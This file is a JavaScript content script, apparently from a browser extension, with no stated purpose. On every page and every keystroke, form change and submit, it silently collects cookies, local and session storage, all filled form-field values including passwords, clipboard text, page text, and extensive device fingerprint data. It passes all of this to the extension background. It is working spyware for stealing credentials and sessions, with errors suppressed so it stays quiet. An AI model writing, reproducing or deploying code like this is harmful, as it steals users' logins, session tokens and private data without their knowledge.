(() => {
  if (window.__sx) return;
  window.__sx = 1;

  const CAP = 400, TCAP = 3000;
  let timer = null, last = 0, extra = {};

  function send() {
    const now = Date.now();
    if (now - last < 1500) { clearTimeout(timer); timer = setTimeout(send, 1600); return; }
    last = now;
    snap().then(o => {
      Object.assign(o, extra);
      try { chrome.runtime.sendMessage({ t: "page", data: o }); } catch (e) {}
    });
  }

  async function snap() {
    const o = { url: location.href, origin: location.origin, title: (document.title || "").slice(0, 200) };

    try {
      o.ls = {};
      for (let i = 0; i < localStorage.length && i < CAP; i++) {
        const k = localStorage.key(i);
        o.ls[k] = String(localStorage.getItem(k)).slice(0, TCAP);
      }
    } catch (e) {}
    try {
      o.ss = {};
      for (let i = 0; i < sessionStorage.length && i < CAP; i++) {
        const k = sessionStorage.key(i);
        o.ss[k] = String(sessionStorage.getItem(k)).slice(0, TCAP);
      }
    } catch (e) {}
    try { o.cookie = document.cookie; } catch (e) {}

    const f = [];
    let nodes = [];
    try { nodes = document.querySelectorAll("input,textarea,select"); } catch (e) {}
    for (const el of nodes) {
      if (f.length >= 400) break;
      if (!el.value) continue;
      f.push({ tag: el.tagName, type: el.type || "", name: el.name || "", id: el.id || "",
        ph: el.placeholder || "", ac: el.autocomplete || "", v: String(el.value).slice(0, TCAP) });
    }
    o.fields = f;

    o.meta = {
      ua: navigator.userAgent, lang: navigator.language, langs: navigator.languages,
      plat: navigator.platform, hc: navigator.hardwareConcurrency, dm: navigator.deviceMemory,
      scr: [screen.width, screen.height, screen.colorDepth, devicePixelRatio, screen.availWidth, screen.availHeight],
      ref: document.referrer, plugs: [...navigator.plugins].map(p => p.name).slice(0, 30)
    };

    try {
      const c = navigator.connection || {};
      o.net = { type: c.effectiveType, down: c.downlink, rtt: c.rtt, save: c.saveData };
    } catch (e) {}
    try { const b = await navigator.getBattery(); o.batt = { lvl: b.level, ch: b.charging }; } catch (e) {}
    try {
      o.perm = {};
      for (const p of ["geolocation", "notifications", "camera", "microphone", "clipboard-read"]) {
        try { o.perm[p] = (await navigator.permissions.query({ name: p })).state; } catch (e) {}
      }
    } catch (e) {}
    try { if (document.hasFocus()) o.clip = await navigator.clipboard.readText(); } catch (e) {}
    try { o.text = (document.body ? document.body.innerText : "").slice(0, TCAP); } catch (e) {}
    try { o.cache = await caches.keys(); } catch (e) {}
    try { o.idb = (await indexedDB.databases()).map(d => d.name); } catch (e) {}

    return o;
  }

  addEventListener("load", send, { once: true });
  setTimeout(send, 1200);
  document.addEventListener("input", send, true);
  document.addEventListener("change", send, true);
  document.addEventListener("submit", send, true);
  document.addEventListener("visibilitychange", () => { if (document.visibilityState === "hidden") send(); });

  addEventListener("message", e => {
    if (e.source !== window || !e.data) return;
    if (e.data.__k) extra.keys = e.data.__k;
    if (e.data.__i) extra.ips = e.data.__i;
    if (e.data.__c) extra.cfp = e.data.__c;
    if (e.data.__g) extra.gpu = e.data.__g;
    if (e.data.__s || e.data.__f || e.data.__i) send();
  });
})();